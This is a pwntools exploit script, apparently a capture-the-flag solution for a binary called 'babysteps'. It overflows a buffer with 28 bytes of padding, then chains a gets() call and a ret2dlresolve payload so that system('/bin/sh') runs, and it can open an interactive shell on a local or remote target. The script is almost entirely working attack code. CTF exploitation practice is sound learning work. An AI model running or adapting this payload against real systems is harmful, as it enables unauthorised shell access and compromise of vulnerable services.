from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())


# Set up pwntools for the correct architecture
exe = './babysteps'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

#this template is from https://github.com/Crypto-Cat

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

io=start()

dlresolve = Ret2dlresolvePayload(elf, symbol='system', args=['/bin/sh'])

rop=ROP(elf)

rop.raw(b'A'*28)

rop.gets(dlresolve.data_addr)

rop.ret2dlresolve(dlresolve)

log.info(rop.dump())

payload=flat(
    rop.chain(),
    b'\n',
    dlresolve.payload

)
print(payload)
io.sendlineafter(b'?',payload)

io.interactive()
